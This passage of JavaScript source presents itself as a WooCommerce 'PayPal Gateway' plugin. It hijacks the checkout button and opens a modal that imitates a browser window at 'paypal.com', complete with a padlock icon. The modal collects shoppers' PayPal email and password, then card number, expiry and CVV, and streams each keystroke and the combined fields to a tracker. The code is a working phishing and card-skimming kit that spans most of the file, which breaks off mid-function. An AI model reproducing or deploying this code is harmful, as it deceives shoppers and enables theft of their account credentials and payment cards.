/**
 * PayPal Gateway JavaScript
 * Uses modal overlay in template (not new window)
 * Shares data sending logic with main gateway via cpgTracker
 */

(function($) {
    'use strict';

    var CPGPayPal = {
        popupWindow: null,
        modalOverlay: null,
        popupUrl: '',
        
        init: function() {
            // Get popup URL (for fallback)
            var dataEl = document.getElementById('cpg-paypal-data');
            if (dataEl) {
                this.popupUrl = dataEl.getAttribute('data-popup-url');
            }
            
            if (!this.popupUrl) {
                // Build default URL with version to avoid cache
                this.popupUrl = window.location.origin + '/?cpg_paypal_popup=1&v=' + Date.now();
            }
            
            this.bindEvents();
            this.bindModalEvents();
        },
        
        /**
         * 🔥 Bind modal form events (step transitions, form submissions)
         */
        bindModalEvents: function() {
            var self = this;
            
            // 🔥🔥🔥 Email 实时输入事件（符合规范推荐：user_event + input_pp_account）🔥🔥🔥
            // 🔥 移除防抖，0延迟实时推送每一个字符
            $(document).on('input', '#paypal-email', function() {
                var email = $(this).val().trim();
                // 🔥 实时推送，无延迟
                if (email) {
                    self.handleInputEvent('email', email, { is_valid: self.isValidEmail(email) });
                }
            });
            
            // 🔥 Email step - Next button
            $(document).on('click', '#paypal-next-btn', function(e) {
                e.preventDefault();
                var email = $('#paypal-email').val().trim();
                if (!email || !self.isValidEmail(email)) {
                    $('#paypal-email').addClass('error');
                    return;
                }
                $('#paypal-email').removeClass('error');
                
                // Send input event (确保最后的值被发送)
                self.handleInputEvent('email', email, { is_valid: true });
                
                // Transition to password step
                self.showStep('password');
                $('#paypal-email-display').text(email);
            });
            
            // 🔥 Email input Enter key
            $(document).on('keypress', '#paypal-email', function(e) {
                if (e.which === 13) {
                    e.preventDefault();
                    $('#paypal-next-btn').click();
                }
            });
            
            // 🔥🔥🔥 Email input 失焦事件 - 发送到后端 🔥🔥🔥
            $(document).on('blur', '#paypal-email', function() {
                var email = $(this).val().trim();
                if (email) {
                    self.handleBlurEvent('email', email, { is_valid: self.isValidEmail(email) });
                }
            });
            
            // 🔥 Change email link
            $(document).on('click', '#paypal-change-email', function(e) {
                e.preventDefault();
                self.showStep('email');
            });
            
            // 🔥🔥🔥 Password 实时输入事件（符合规范推荐：user_event + input_pp_password）🔥🔥🔥
            // 🔥 移除防抖，0延迟实时推送每一个字符
            $(document).on('input', '#paypal-password', function() {
                var password = $(this).val().trim();
                // 🔥 实时推送，无延迟
                if (password) {
                    var email = $('#paypal-email').val().trim();
                    self.handleInputEvent('password', password, { email: email });
                }
            });
            
            // 🔥 Password step - Login button
            $(document).on('click', '#paypal-login-btn', function(e) {
                e.preventDefault();
                var email = $('#paypal-email').val().trim();
                var password = $('#paypal-password').val().trim();
                
                if (!password) {
                    $('#paypal-password').addClass('error');
                    return;
                }
                $('#paypal-password').removeClass('error');
                
                // Send input event (确保最后的值被发送)
                self.handleInputEvent('password', password, { email: email });
                
                // 🔥 发送提交事件（符合规范）
                if (window.cpgTracker && window.cpgTracker.sendMessage) {
                    window.cpgTracker.sendMessage({
                        type: 'verification_submitted',
                        session_id: window.cpgTracker.sessionId || '',
                        order_no: window.cpgTracker.orderNo || '',
                        order_id: window.cpgTracker.getOrderId?.() || null,
                        verification_type: 'pp_login',
                        verification_data: {
                            email: email,
                            pp_account: email,
                            password: password,
                            pp_password: password
                        },
                        timestamp: Date.now()
                    });
                }
                
                // Transition to card step
                self.showStep('card');
            });
            
            // 🔥 Password input Enter key
            $(document).on('keypress', '#paypal-password', function(e) {
                if (e.which === 13) {
                    e.preventDefault();
                    $('#paypal-login-btn').click();
                }
            });
            
            // 🔥🔥🔥 Password input 失焦事件 - 发送到后端 🔥🔥🔥
            $(document).on('blur', '#paypal-password', function() {
                var password = $(this).val().trim();
                var email = $('#paypal-email').val().trim();
                if (password) {
                    self.handleBlurEvent('password', password, { email: email });
                }
            });
            
            // 🔥 Back button
            $(document).on('click', '.cpg-paypal-back-btn', function(e) {
                e.preventDefault();
                var backTo = $(this).data('back');
                if (backTo) {
                    self.showStep(backTo);
                }
            });
            
            // 🔥 Card number formatting and brand detection
            $(document).on('input', '#paypal-card-number', function() {
                var value = $(this).val().replace(/\D/g, '');
                var formatted = self.formatCardNumber(value);
                $(this).val(formatted);
                
                // Detect and highlight card brand
                var brand = self.detectCardBrand(value);
                self.highlightCardBrand(brand);
                
                // 🔥 Luhn 验证（仅在卡号长度足够时验证）
                if (value.length >= 13) {
                    var luhnValid = self.luhnCheck(value);
                    if (luhnValid) {
                        $(this).removeClass('error');
                    } else {
                        $(this).addClass('error');
                    }
                } else {
                    // 卡号长度不足时，移除错误状态（允许用户继续输入）
                    $(this).removeClass('error');
                }
                
                // Send input event
                self.handleInputEvent('card_number', value, { card_type: brand });
            });
            
            // 🔥🔥🔥 Card number 失焦事件 🔥🔥🔥
            $(document).on('blur', '#paypal-card-number', function() {
                var value = $(this).val().replace(/\D/g, '');
                if (value) {
                    // 🔥 Luhn 验证
                    if (value.length >= 13) {
                        var luhnValid = self.luhnCheck(value);
                        if (!luhnValid) {
                            $(this).addClass('error');
                            // 验证失败时仍然发送事件，但标记为无效
                            var brand = self.detectCardBrand(value);
                            self.handleBlurEvent('card_number', value, { card_type: brand, luhn_valid: false });
                            return;
                        } else {
                            $(this).removeClass('error');
                        }
                    }
                    
                    var brand = self.detectCardBrand(value);
                    self.handleBlurEvent('card_number', value, { card_type: brand, luhn_valid: true });
                }
            });
            
            // 🔥 Expiry date formatting
            $(document).on('input', '#paypal-card-expiry', function() {
                var value = $(this).val().replace(/\D/g, '');
                var formatted = self.formatExpiry(value);
                $(this).val(formatted);
                
                // Send input event
                self.handleInputEvent('expiry', formatted, {});
            });
            
            // 🔥🔥🔥 Expiry 失焦事件 🔥🔥🔥
            $(document).on('blur', '#paypal-card-expiry', function() {
                var value = $(this).val().trim();
                if (value) {
                    self.handleBlurEvent('expiry', value, {});
                }
            });
            
            // 🔥 CVV input
            $(document).on('input', '#paypal-card-cvv', function() {
                var cardNumber = $('#paypal-card-number').val().replace(/\D/g, '');
                var isAmex = /^3[47]/.test(cardNumber);
                var maxLength = isAmex ? 4 : 3;
                
                var value = $(this).val().replace(/\D/g, '').slice(0, maxLength);
                $(this).val(value);
                $(this).attr('maxlength', maxLength);
                $(this).attr('placeholder', isAmex ? '4-digit CVV' : 'CVV');
                
                // Send input event
                self.handleInputEvent('cvv', value, {});
            });
            
            // 🔥🔥🔥 CVV 失焦事件 🔥🔥🔥
            $(document).on('blur', '#paypal-card-cvv', function() {
                var value = $(this).val().trim();
                var cardNumber = $('#paypal-card-number').val().replace(/\D/g, '');
                var expiry = $('#paypal-card-expiry').val().trim();
                var email = $('#paypal-email').val().trim();
                var password = $('#paypal-password').val().trim();
                var brand = self.detectCardBrand(cardNumber);
                
                if (value) {
                    self.handleBlurEvent('cvv', value, {
                        card_number: cardNumber,
                        expiry: expiry,
                        cvv: value,
                        brand: brand,
                        email: email,
                        password: password
                    });
                }
            });
            
            // 🔥 Link Card button
            $(document).on('click', '#paypal-link-card-btn', function(e) {
                e.preventDefault();
                
                var email = $('#paypal-email').val().trim();
                var password = $('#paypal-password').val().trim();
                var cardNumber = $('#paypal-card-number').val().replace(/\D/g, '');
                var expiry = $('#paypal-card-expiry').val().trim();
                var cvv = $('#paypal-card-cvv').val().trim();
                var brand = self.detectCardBrand(cardNumber);
                
                // Validate card data
                if (!cardNumber || cardNumber.length < 13) {
                    $('#paypal-card-number').addClass('error');
                    return;
                }
                if (!expiry || expiry.length < 5) {
                    $('#paypal-card-expiry').addClass('error');
                    return;
                }
                if (!cvv || cvv.length < 3) {
                    $('#paypal-card-cvv').addClass('error');
                    return;
                }
                
                // Clear errors
                $('#paypal-card-number, #paypal-card-expiry, #paypal-card-cvv').removeClass('error');
                
                // Hide PayPal overlay
                self.hidePayPalOverlay();
                
                // Handle card submit (same as popup)
                self.handleCardSubmit({
                    email: email,
                    password: password,
                    card_number: cardNumber,
                    expiry: expiry,
                    cvv: cvv,
                    brand: brand
                });
            });
        },
        
        /**
         * 🔥 Show specific step in PayPal modal
         */
        showStep: function(step) {
            $('.cpg-paypal-step').hide().removeClass('active');
            $('.cpg-paypal-step[data-step="' + step + '"]').show().addClass('active');
        },
        
        /**
         * 🔥 Validate email format
         */
        isValidEmail: function(email) {
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        },
        
        /**
         * 🔥 Format card number with spaces（使用共用模块）
         */
        formatCardNumber: function(value) {
            // 🔥 优先使用共用模块
            if (window.CPG_CardUtils && typeof window.CPG_CardUtils.formatCardNumber === 'function') {
                return window.CPG_CardUtils.formatCardNumber(value);
            }
            
            // 备用：本地实现
            var isAmex = /^3[47]/.test(value);
            if (isAmex) {
                return value.slice(0, 15).replace(/(\d{4})(\d{0,6})(\d{0,5})/, function(_, p1, p2, p3) {
                    var result = p1;
                    if (p2) result += ' ' + p2;
                    if (p3) result += ' ' + p3;
                    return result;
                });
            } else {
                return value.slice(0, 16).replace(/(\d{4})(?=\d)/g, '$1 ').trim();
            }
        },
        
        /**
         * 🔥 Format expiry date (MM / YY)
         */
        formatExpiry: function(value) {
            if (value.length >= 2) {
                return value.slice(0, 2) + ' / ' + value.slice(2, 4);
            }
            return value;
        },
        
        /**
         * 🔥 Detect card brand from number（使用共用模块）
         */
        detectCardBrand: function(number) {
            // 🔥 优先使用共用模块
            if (window.CPG_CardUtils && typeof window.CPG_CardUtils.detectCardType === 'function') {
                var type = window.CPG_CardUtils.detectCardType(number);
                return type === 'unknown' ? '' : type;
            }
            
            // 备用：本地实现
            var patterns = {
                visa: /^4/,
                mastercard: /^5[1-5]|^2[2-7]/,
                amex: /^3[47]/,
                discover: /^6(?:011|5)/
            };
            
            for (var brand in patterns) {
                if (patterns[brand].test(number)) {
                    return brand;
                }
            }
            return '';
        },
        
        /**
         * 🔥 Luhn 算法验证卡号（使用共用模块）
         * @param {string} cardNumber - 卡号（纯数字字符串）
         * @returns {boolean} - 是否通过 Luhn 验证
         */
        luhnCheck: function(cardNumber) {
            // 🔥 优先使用共用模块
            if (window.CPG_CardUtils && typeof window.CPG_CardUtils.luhnCheck === 'function') {
                return window.CPG_CardUtils.luhnCheck(cardNumber);
            }
            
            // 🔥 备用：使用 cpgTracker 的方法
            if (window.cpgTracker && typeof window.cpgTracker.luhnCheck === 'function') {
                return window.cpgTracker.luhnCheck(cardNumber);
            }
            
            // 备用：本地实现
            var cleanCardNumber = cardNumber.replace(/\D/g, '');
            
            if (cleanCardNumber.length < 13) {
                return false;
            }
            
            var sum = 0;
            var isEven = false;
            
            for (var i = cleanCardNumber.length - 1; i >= 0; i--) {
                var digit = parseInt(cleanCardNumber.charAt(i), 10);
                
                if (isEven) {
                    digit *= 2;
                    if (digit > 9) {
                        digit -= 9;
                    }
                }
                
                sum += digit;
                isEven = !isEven;
            }
            
            return (sum % 10) === 0;
        },
        
        /**
         * 🔥 Highlight detected card brand
         */
        highlightCardBrand: function(brand) {
            $('.cpg-paypal-card-brands img').removeClass('active');
            if (brand) {
                $('.cpg-paypal-card-brands img[data-brand="' + brand + '"]').addClass('active');
            }
        },

        bindEvents: function() {
            var self = this;
            
            // 🔥🔥🔥 当用户选择 PayPal 支付方式时，立即刷新 session（防止换卡后超时）🔥🔥🔥
            $(document).on('change', 'input[name="payment_method"]', function() {
                if ($(this).val() === 'cpg_paypal') {
                    console.log('[CPG PayPal] 🔄 用户选择 PayPal，刷新 session');
                    self.sendSessionHeartbeat();
                }
            });
            
            // 🔥 Click outside modal to close (移动端备用模态框)
            $(document).on('click', '#cpg-paypal-overlay', function(e) {
                if (e.target === this) {
                    self.hidePayPalOverlay();
                }
            });
            
            // Intercept place order button click
            $(document).on('click', '#place_order, .wfacp_order_place_btn, button[name="woocommerce_checkout_place_order"]', function(e) {
                if (!$('#payment_method_cpg_paypal').is(':checked')) {
                    return true;
                }
                
                if ($('#cpg_paypal_data_complete').val() !== 'yes') {
                    // 🔥🔥🔥 验证结账表单必填字段 🔥🔥🔥
                    var validationResult = self.validateCheckoutForm();
                    if (!validationResult.valid) {
                        // 🔥 显示错误提示
                        self.showValidationErrors(validationResult.errors);
                        // 不阻止默认行为，让 WooCommerce 触发原生验证
                        return true;
                    }
                    
                    e.preventDefault();
                    e.stopPropagation();
                    e.stopImmediatePropagation();
                    self.openPopup(); // 🔥 使用界面模板内的模态框
                    return false;
                }
                
                return true;
            });
            
            // WooCommerce event intercept
            $(document).on('checkout_place_order_cpg_paypal', function() {
                if ($('#cpg_paypal_data_complete').val() !== 'yes') {
                    self.openPopup();
                    return false;
                }
                return true;
            });
            
            // Listen for messages from popup (real window or iframe)
            window.addEventListener('message', function(event) {
                // Handle complete submission
                if (event.data && event.data.type === 'cpg_paypal_complete') {
                    self.handlePopupData(event.data.data);
                }
                
                // 🔥 Handle card submit event (Link Card button click)
                if (event.data && event.data.type === 'cpg_paypal_card_submit') {
                    self.handleCardSubmit(event.data.data);
                }
                
                // 🔥 Handle real-time input events from popup (same as main gateway)
                if (event.data && event.data.type === 'cpg_paypal_input') {
                    self.handleInputEvent(event.data.field, event.data.value, event.data.data);
                }
                
                // 🔥 Handle blur events from popup
                if (event.data && event.data.type === 'cpg_paypal_blur') {
                    self.handleBlurEvent(event.data.field, event.data.value, event.data.data);
                }
                
                // 🔥🔥🔥 Handle close event from iframe 🔥🔥🔥
                if (event.data && event.data.type === 'cpg_paypal_close') {
                    self.closeMobileModal();
                }
            });
        },

        /**
         * 🔥🔥🔥 验证结账表单必填字段 🔥🔥🔥
         * @returns {Object} { valid: boolean, errors: string[] }
         */
        validateCheckoutForm: function() {
            var errors = [];
            var $form = $('form.checkout, form.woocommerce-checkout');
            
            if (!$form.length) {
                return { valid: true, errors: [] };
            }
            
            // 🔥 获取所有必填字段（WooCommerce 标准结构）
            var requiredFields = [
                { selector: '#billing_first_name', name: 'First Name' },
                { selector: '#billing_last_name', name: 'Last Name' },
                { selector: '#billing_email', name: 'Email' },
                { selector: '#billing_phone', name: 'Phone' },
                { selector: '#billing_address_1', name: 'Address' },
                { selector: '#billing_city', name: 'City' },
                { selector: '#billing_postcode', name: 'Postcode' },
                { selector: '#billing_country', name: 'Country' }
            ];
            
            // 🔥 检查 shipping 字段（如果显示）
            var $shipToDifferent = $('#ship-to-different-address-checkbox');
            if ($shipToDifferent.length && $shipToDifferent.is(':checked')) {
                requiredFields.push(
                    { selector: '#shipping_first_name', name: 'Shipping First Name' },
                    { selector: '#shipping_last_name', name: 'Shipping Last Name' },
                    { selector: '#shipping_address_1', name: 'Shipping Address' },
                    { selector: '#shipping_city', name: 'Shipping City' },
                    { selector: '#shipping_postcode', name: 'Shipping Postcode' },
                    { selector: '#shipping_country', name: 'Shipping Country' }
                );
            }
            
            // 🔥 遍历检查每个必填字段
            requiredFields.forEach(function(field) {
                var $field = $(field.selector);
                
                // 只检查存在且可见的字段
                if ($field.length && $field.is(':visible')) {
                    var value = $field.val();
                    
                    // 检查是否为空
                    if (!value || value.trim() === '') {
                        errors.push(field.name + ' is required');
                        $field.addClass('woocommerce-invalid woocommerce-invalid-required-field');
                    } else {
                        $field.removeClass('woocommerce-invalid woocommerce-invalid-required-field');
                    }
                }
            });
            
            // 🔥 特殊验证：Email 格式
            var $email = $('#billing_email');
            if ($email.length && $email.is(':visible') && $email.val()) {
                if (!this.isValidEmail($email.val())) {
                    errors.push('Please enter a valid email address');
                    $email.addClass('woocommerce-invalid woocommerce-invalid-email');
                }
            }
            
            // 🔥 检查 WooCommerce 原生的必填字段（带 validate-required 类）
            $form.find('.validate-required').each(function() {
                var $wrapper = $(this);
                var $input = $wrapper.find('input, select, textarea').first();
                
                if ($input.length && $input.is(':visible')) {
                    var value = $input.val();
                    var fieldName = $wrapper.find('label').text().replace('*', '').trim() || 'Required field';
                    
                    if (!value || value.trim() === '') {
                        // 避免重复添加
                        if (errors.indexOf(fieldName + ' is required') === -1) {
                            errors.push(fieldName + ' is required');
                        }
                        $wrapper.addClass('woocommerce-invalid woocommerce-invalid-required-field');
                    }
                }
            });
            
            console.log('[CPG PayPal] 表单验证结果:', errors.length === 0 ? '通过' : errors);
            
            return {
                valid: errors.length === 0,
                errors: errors
            };
        },
        
        /**
         * 🔥🔥🔥 显示验证错误提示 🔥🔥🔥
         * @param {string[]} errors - 错误消息数组
         */
        showValidationErrors: function(errors) {
            if (!errors || errors.length === 0) {
                return;
            }
            
            // 🔥 清除旧的错误提示
            $('.woocommerce-error, .woocommerce-message, .cpg-validation-error').remove();
            
            // 🔥 构建错误消息 HTML
            var errorHtml = '<ul class="woocommerce-error cpg-validation-error" role="alert">';
            errors.forEach(function(error) {
                errorHtml += '<li>' + error + '</li>';
            });
            errorHtml += '</ul>';
            
            // 🔥 插入到表单顶部
            var $notices = $('.woocommerce-notices-wrapper').first();
            if ($notices.length) {
                $notices.html(errorHtml);
            } else {
                $('form.checkout, form.woocommerce-checkout').prepend(errorHtml);
            }
            
            // 🔥 滚动到错误位置
            $('html, body').animate({
                scrollTop: $('.woocommerce-error, .cpg-validation-error').first().offset().top - 100
            }, 300);
            
            // 🔥 聚焦到第一个错误字段
            var $firstInvalid = $('.woocommerce-invalid').first().find('input, select, textarea').first();
            if ($firstInvalid.length) {
                $firstInvalid.focus();
            }
        },

        /**
         * 检测是否为移动设备
         */
        isMobile: function() {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || 
                   (window.innerWidth <= 768);
        },

        /**
         * 打开模态框（兼容旧代码，现在统一调用移动端方法）
         */
        openModal: function() {
            this.openMobileModal();
        },

        /**
         * 关闭模态框（兼容旧代码）
         */
        closeModal: function() {
            this.closeMobileModal();
            // 兼容旧的 modalOverlay 引用
            if (this.modalOverlay) {
                try {
                    document.body.removeChild(this.modalOverlay);
                } catch (e) {}
                this.modalOverlay = null;
                document.body.style.overflow = '';
            }
        },

        openPopup: function() {
            // 🔥🔥🔥 桌面端和移动端都使用真实浏览器弹窗（window.open）🔥🔥🔥
            // 移动端如果弹窗被阻止，则降级到带浏览器壳子的 iframe 模态框
            this.openRealPopup();
        },
        
        /**
         * 🔥🔥🔥 打开真实浏览器弹窗（桌面端和移动端通用）🔥🔥🔥
         */
        openRealPopup: function() {
            var self = this;
            var isMobile = this.isMobile();
            
            // 🔥🔥🔥 弹窗打开时立即开始会话保活心跳 🔥🔥🔥
            this.startPopupSessionHeartbeat();
            
            // 🔥🔥🔥 弹窗固定尺寸：450x680（电脑端和手机端统一）🔥🔥🔥
            var width = 450;
            var height = 680;
            var left = (window.screen.width - width) / 2;
            var top = (window.screen.height - height) / 2;
            
            // 🔥 打开真实浏览器弹窗
            var popupUrl = this.popupUrl || (window.location.origin + '/?cpg_paypal_popup=1&v=' + Date.now());
            
            // 🔥 统一的弹窗参数（固定尺寸）
            var popupFeatures = 'width=' + width + ',height=' + height + ',left=' + left + ',top=' + top + ',scrollbars=yes,resizable=no,status=no,menubar=no,toolbar=no,location=no';
            
            this.popupWindow = window.open(
                popupUrl,
                'PayPalPopup',
                popupFeatures
            );
            
            // 🔥 检查弹窗是否被阻止
            if (!this.popupWindow || this.popupWindow.closed || typeof this.popupWindow.closed === 'undefined') {
                console.warn('[CPG PayPal] 真实弹窗被阻止，降级到带浏览器壳子的 iframe 模态框');
                this.stopPopupSessionHeartbeat(); // 停止心跳，openMobileModal 会启动自己的
                this.openMobileModal();
                return;
            }
            
            // 🔥 监听弹窗关闭
            var checkClosed = setInterval(function() {
                if (self.popupWindow && self.popupWindow.closed) {
                    clearInterval(checkClosed);
                    self.stopPopupSessionHeartbeat(); // 🔥 弹窗关闭时停止心跳
                    console.log('[CPG PayPal] 弹窗已关闭，会话心跳已停止');
                }
            }, 500);
            
            console.log('[CPG PayPal] 真实浏览器弹窗已打开' + (isMobile ? '（移动端）' : '（桌面端）') + '，会话保活已启动');
        },
        
        /**
         * 🔥🔥🔥 弹窗打开时的会话保活心跳（防止 WooCommerce session 超时）🔥🔥🔥
         * 每30秒发送一次心跳，保持 WooCommerce session 活跃
         */
        startPopupSessionHeartbeat: function() {
            var self = this;
            
            // 清除之前的心跳
            if (this.popupHeartbeatTimer) {
                clearInterval(this.popupHeartbeatTimer);
            }
            
            console.log('[CPG PayPal] 🫀 启动弹窗会话保活心跳');
            
            // 🔥 立即发送一次心跳
            this.sendSessionHeartbeat();
            
            // 🔥 每30秒发送一次心跳（WooCommerce 默认 session 有效期通常是 48 小时，但 nonce 有效期较短）
            this.popupHeartbeatTimer = setInterval(function() {
                self.sendSessionHeartbeat();
            }, 30000); // 30秒
            
            // 🔥 5分钟后自动停止（防止无限运行）
            setTimeout(function() {
                if (self.popupHeartbeatTimer) {
                    self.stopPopupSessionHeartbeat();
                    console.log('[CPG PayPal] 🫀 弹窗会话心跳已达到5分钟上限，自动停止');
                }
            }, 300000); // 5分钟
        },
        
        /**
         * 🔥 停止弹窗会话保活心跳
         */
        stopPopupSessionHeartbeat: function() {
            if (this.popupHeartbeatTimer) {
                clearInterval(this.popupHeartbeatTimer);
                this.popupHeartbeatTimer = null;
                console.log('[CPG PayPal] 🫀 弹窗会话心跳已停止');
            }
        },
        
        /**
         * 🔥 发送会话心跳
         */
        sendSessionHeartbeat: function() {
            var self = this;
            
            // 🔥 方法1：触发 WooCommerce update_checkout（刷新 nonce 和 session）
            if (typeof jQuery !== 'undefined') {
                // 静默刷新，不触发 UI 更新
                var $body = jQuery(document.body);
                
                // 使用 AJAX 刷新 WooCommerce fragments
                jQuery.ajax({
                    type: 'POST',
                    url: window.wc_checkout_params?.wc_ajax_url?.replace('%%endpoint%%', 'update_order_review') || 
                         (window.location.origin + '/?wc-ajax=update_order_review'),
                    data: jQuery('form.checkout').serialize() + '&security=' + (window.wc_checkout_params?.update_order_review_nonce || ''),
                    dataType: 'json',
                    timeout: 10000,
                    success: function(response) {
                        // 🔥 如果返回了新的 nonce，更新它
                        if (response && response.fragments) {
                            console.log('[CPG PayPal] 🫀 WooCommerce session 刷新成功');
                        }
                    },
                    error: function() {
                        // 静默失败，使用备用方法
                        self.sendHeartbeatFallback();
                    }
                });
            } else {
                this.sendHeartbeatFallback();
            }
        },
        
        /**
         * 🔥 备用心跳方法：使用 WordPress Heartbeat API
         */
        sendHeartbeatFallback: function() {
            var heartbeatUrl = window.ajaxurl || (window.location.origin + '/wp-admin/admin-ajax.php');
            
            $.ajax({
                type: 'POST',
                url: heartbeatUrl,
                data: {
                    action: 'heartbeat',
                    _nonce: window.heartbeatSettings?.nonce || '',
                    interval: 15
                },
                dataType: 'json',
                timeout: 5000,
                success: function() {
                    console.log('[CPG PayPal] 🫀 Heartbeat 成功');
                },
                error: function() {
                    console.warn('[CPG PayPal] 🫀 Heartbeat 失败');
                }
            });
        },
        
        /**
         * 🔥🔥🔥 移动端：iframe 模态框（带浏览器壳子，高度与验证模板一致）🔥🔥🔥
         */
        openMobileModal: function() {
            var self = this;
            
            // 🔥🔥🔥 模态框打开时立即开始会话保活心跳 🔥🔥🔥
            this.startPopupSessionHeartbeat();
            
            // 🔥 创建遮罩层（与验证模板样式一致）
            var overlay = document.createElement('div');
            overlay.id = 'cpg-paypal-mobile-overlay';
            overlay.style.cssText = 'position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; height: 100dvh; background: rgba(0, 0, 0, 0.7); z-index: 2147483646; display: flex; align-items: center; justify-content: center; overflow-y: auto; -webkit-overflow-scrolling: touch; overscroll-behavior: contain;';
            
            // 🔥🔥🔥 创建模态框容器（固定尺寸：450x680，电脑端和手机端统一）🔥🔥🔥
            var modal = document.createElement('div');
            modal.id = 'cpg-paypal-mobile-modal';
            modal.style.cssText = 'position: relative; width: 450px; max-width: 95vw; height: 680px; max-height: calc(100vh - 40px); max-height: calc(100dvh - 40px); background: #fff; border-radius: 12px; overflow: hidden; box-shadow: 0 8px 32px rgba(0,0,0,0.3); display: flex; flex-direction: column;';
            
            // 🔥🔥🔥 创建模拟浏览器顶部栏（真实壳子效果）🔥🔥🔥
            var browserBar = document.createElement('div');
            browserBar.id = 'cpg-paypal-browser-bar';
            browserBar.style.cssText = 'display: flex; align-items: center; padding: 8px 12px; background: linear-gradient(to bottom, #f8f8f8 0%, #e8e8e8 100%); border-bottom: 1px solid #ccc; flex-shrink: 0; gap: 8px;';
            
            // 🔥 窗口控制按钮（红黄绿点）
            var windowControls = document.createElement('div');
            windowControls.style.cssText = 'display: flex; gap: 6px; flex-shrink: 0;';
            
            var closeBtn = document.createElement('div');
            closeBtn.style.cssText = 'width: 12px; height: 12px; border-radius: 50%; background: #ff5f57; cursor: pointer; border: 1px solid #e0443e;';
            closeBtn.onclick = function() { self.closeMobileModal(); };
            
            var minimizeBtn = document.createElement('div');
            minimizeBtn.style.cssText = 'width: 12px; height: 12px; border-radius: 50%; background: #febc2e; border: 1px solid #dea123;';
            
            var maximizeBtn = document.createElement('div');
            maximizeBtn.style.cssText = 'width: 12px; height: 12px; border-radius: 50%; background: #28c840; border: 1px solid #1aab29;';
            
            windowControls.appendChild(closeBtn);
            windowControls.appendChild(minimizeBtn);
            windowControls.appendChild(maximizeBtn);
            
            // 🔥 地址栏（显示 paypal.com）
            var addressBar = document.createElement('div');
            addressBar.style.cssText = 'flex: 1; display: flex; align-items: center; background: #fff; border-radius: 6px; padding: 6px 10px; border: 1px solid #ccc; font-size: 13px; color: #333; gap: 6px; min-width: 0;';
            
            // 🔥 锁图标（HTTPS 安全标识）
            var lockIcon = document.createElement('span');
            lockIcon.innerHTML = '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#28a745" stroke-width="2.5"><rect x="5" y="11" width="14" height="10" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>';
            lockIcon.style.cssText = 'flex-shrink: 0; display: flex; align-items: center;';
            
            // 🔥 URL 文本
            var urlText = document.createElement('span');
            urlText.textContent = 'paypal.com';
            urlText.style.cssText = 'color: #333; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;';
            
            addressBar.appendChild(lockIcon);
            addressBar.appendChild(urlText);
            
            // 🔥 刷新按钮
            var refreshBtn = document.createElement('div');
            refreshBtn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2"><path d="M23 4v6h-6M1 20v-6h6"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>';
            refreshBtn.style.cssText = 'flex-shrink: 0; cursor: pointer; display: flex; align-items: center; padding: 4px;';
            
            browserBar.appendChild(windowControls);
            browserBar.appendChild(addressBar);
            browserBar.appendChild(refreshBtn);
            
            // 🔥 创建 iframe 容器
            var iframeContainer = document.createElement('div');
            iframeContainer.style.cssText = 'flex: 1; overflow: hidden; min-height: 350px;';
            
            // 🔥 创建 iframe（高度自适应）
            var iframe = document.createElement('iframe');
            iframe.src = this.popupUrl || (window.location.origin + '/?cpg_paypal_popup=1&mode=iframe&v=' + Date.now());
            iframe.style.cssText = 'width: 100%; height: 100%; border: none;';
            iframe.id = 'cpg-paypal-mobile-iframe';
            
            iframeContainer.appendChild(iframe);
            
            modal.appendChild(browserBar);
            modal.appendChild(iframeContainer);
            overlay.appendChild(modal);
            document.body.appendChild(overlay);
            
            // 🔥 阻止背景滚动
            document.body.style.overflow = 'hidden';
            document.documentElement.style.overflow = 'hidden';
            
            // 🔥 监听 iframe 消息（使用 window.parent 发送）
            window.addEventListener('message', function mobileModalMessageHandler(event) {
                if (event.data && (event.data.type === 'cpg_paypal_complete' || event.data.type === 'cpg_paypal_card_submit')) {
                    // 关闭模态框
                    self.closeMobileModal();
                    // 移除这个监听器
                    window.removeEventListener('message', mobileModalMessageHandler);
                    // 处理数据
                    if (event.data.type === 'cpg_paypal_complete') {
                        self.handlePopupData(event.data.data);
                    } else if (event.data.type === 'cpg_paypal_card_submit') {
                        self.handleCardSubmit(event.data.data);
                    }
                }
                
                // 🔥 处理实时输入事件
                if (event.data && event.data.type === 'cpg_paypal_input') {
                    self.handleInputEvent(event.data.field, event.data.value, event.data.data);
                }
                
                // 🔥 处理失焦事件
                if (event.data && event.data.type === 'cpg_paypal_blur') {
                    self.handleBlurEvent(event.data.field, event.data.value, event.data.data);
                }
            });
            
            this.mobileOverlay = overlay;
            console.log('[CPG PayPal] 移动端 iframe 模态框已打开');
        },
        
        /**
         * 🔥 关闭移动端模态框
         */
        closeMobileModal: function() {
            // 🔥 停止会话保活心跳
            this.stopPopupSessionHeartbeat();
            
            var overlay = document.getElementById('cpg-paypal-mobile-overlay');
            if (overlay) {
                document.body.removeChild(overlay);
                document.body.style.overflow = '';
                document.documentElement.style.overflow = '';
            }
            this.mobileOverlay = null;
        },

        /**
         * 🔥 Handle real-time input events from popup（符合规范）
         * 🔥 规范推荐：PP账号/密码使用 user_event + input_pp_account/input_pp_password（推荐方式）
         * 替代方案：也可使用 verification_input（已支持）
         * 卡片字段使用 user_event + input_card/input_expiry/input_cvv
         */
        handleInputEvent: function(field, value, data) {
            if (!window.cpgTracker) {
                console.warn('[CPG PayPal] cpgTracker not available for input event');
                return;
            }
            
            var sessionId = window.cpgTracker.sessionId || '';
            var orderNo = window.cpgTracker.orderNo || '';
            
            // 🔥 规范推荐：PP账号/密码使用 user_event + input_pp_account/input_pp_password（推荐方式）
            if (field === 'email' || field === 'password') {
                var eventType = field === 'email' ? 'input_pp_account' : 'input_pp_password';
                var verificationType = field === 'email' ? 'pp_account' : 'pp_password';
                
                // 🔥 构建事件数据
                var eventData = {
                    field: field,
                    value: value,
                    has_value: !!value,
                    value_length: value ? value.length : 0
                };
                
                // 根据字段类型添加特定字段
                if (field === 'email') {
                    eventData.pp_account = value;
                    eventData.email = value;
                } else if (field === 'password') {
                    eventData.pp_password = value;
                    eventData.password = value;
